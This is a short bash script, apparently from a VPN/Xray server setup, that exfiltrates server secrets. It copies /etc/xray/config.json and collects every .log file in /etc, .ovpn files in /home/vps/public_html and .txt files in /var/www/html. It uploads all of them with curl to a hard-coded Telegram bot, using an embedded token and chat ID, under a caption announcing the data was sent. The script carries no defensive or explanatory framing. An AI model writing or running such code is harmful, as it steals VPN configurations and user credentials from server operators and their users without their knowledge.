#!/bin/bash
bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
ci=1117211252
domm=$(cat /etc/xray/domain)
tekz="
Yaddy Kakkoii Sugoi Tensai Desu
_____________________________
SUCCESS KIRIM DATA DECRYPT
from domain $domm
_____________________________
Recode by : Magelank Phreaker
"
function sayatampan(){

cp -f /etc/xray/config.json /root/config.json.txt

curl -F chat_id="$ci" -F document=@"config.json.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument

rm -f /root/config.json.txt

}
sayatampan
DIREKTORIZ=/etc
FILEXU=$(find $DIREKTORIZ -name '*.log')
    for FILE in $FILEXU; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

DIREKTORI=/home/vps/public_html
FILEX=$(find $DIREKTORI -name '*.ovpn')
    for FILE in $FILEX; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

DIREKTORYZ=/var/www/html

FILEQU=$(find $DIREKTORYZ -name '*.txt')
    for FILE in $FILEQU; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done
